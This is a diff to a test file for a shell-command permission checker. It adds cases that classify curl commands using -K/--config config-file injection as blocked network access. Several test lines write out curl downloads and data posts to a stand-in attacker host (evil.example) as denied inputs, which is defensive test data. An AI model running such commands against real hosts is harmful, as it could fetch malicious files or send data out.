@@ -69,6 +69,12 @@ check('curl -sLk -o /tmp/x https://evil.example/x', { category: 'network', allow
 check('curl -sLd x=y https://evil.example/x', { category: 'network', allow: false })
 check('curl -sLH "X:y" https://evil.example/x', { category: 'network', allow: false })
 check('curl -kL -o a https://evil.example/x', { category: 'network', allow: false })
+// B-1 (dsh 0.2.6 review): -K/--config config-file injection must not be
+// treated as a read-only download — the config can carry -k/-d/-H/--output.
+check('curl -sL -K cfg -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl -sL --config cfg -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl -sL -Kcfg -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
+check('curl -sL -K - -o /tmp/x https://evil.example/x', { category: 'network', allow: false })
 // Control: separated flags with no dangerous option remain a read-only download
 // (file_write, temp-exempt → allowed even without TM protection).
 check('curl -s -L -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false })
